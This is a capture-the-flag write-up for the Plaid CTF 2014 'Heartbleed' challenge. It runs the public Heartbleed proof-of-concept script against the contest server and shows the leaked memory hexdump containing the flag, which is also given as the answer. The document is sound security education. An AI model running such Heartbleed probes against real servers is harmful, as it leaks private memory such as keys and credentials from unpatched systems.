# Plaid CTF 2014: Heartbleed

**Category:** Misc
**Points:** 10
**Description:**

> Our hearts are bleeding. But instead of bleeding password bytes, they're bleeding flags. Please recover our flags so we don't bleed to death before we can update to 1.0.1-g. Site is up at <https://54.82.147.138:45373/>.
>
> (The flag format is `flag{...}`.)

## Write-up

The challenge name makes it pretty clear that the server is vulnerable to the [the Heartbleed bug](http://heartbleed.com/). Let’s use the famous [Heartbleed proof of concept script](heartbleed.py) and see what kind of data the server leaks:

```bash
$ ./heartbleed.py -p 45373 54.82.147.138
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 837
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
	0000: 02 40 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73  .@.flag{hey_guis
	0010: 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72  e_we_made_a_hear
	0020: 74 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79  tbleed}.flag{hey
	0030: 5F 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61  _guise_we_made_a
	0040: 5F 68 65 61 72 74 62 6C 65 65 64 7D 00 66 6C 61  _heartbleed}.fla
	0050: 67 7B 68 65 79 5F 67 75 69 73 65 5F 77 65 5F 6D  g{hey_guise_we_m
	0060: 61 64 65 5F 61 5F 68 65 61 72 74 62 6C 65 65 64  ade_a_heartbleed
	0070: 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65  }.flag{hey_guise
	0080: 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74  _we_made_a_heart
	0090: 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F  bleed}.flag{hey_
	00a0: 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F  guise_we_made_a_
	…
	3fc0: 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65 5F 77  flag{hey_guise_w
	3fd0: 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74 62 6C  e_made_a_heartbl
	3fe0: 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75  eed}.flag{hey_gu
	3ff0: 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65  ise_we_made_a_he

WARNING: server returned more data than it should; server is vulnerable!
```

The flag is `flag{hey\_guise\_we\_made\_a\_heartbleed}`.

## Other write-ups and resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/heartbleed)
* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/Heartbleed/WRITEUP-pipecork.md>
* <http://csrc.tamuc.edu/css/?p=152>
* <https://docs.google.com/document/d/1Y0wGrFkGUsK9Gzqh4sQnMHZDgWfMMvfPUN-vVjPNDfI/edit?pli=1>
* <http://akaminsky.net/plaidctf-quals-2014-misc-10-heartbleed/>
* [Spanish](http://crackinglandia.blogspot.com.ar/2014/04/plaidctf-2014-heartbleed-misc-10-pts.html)
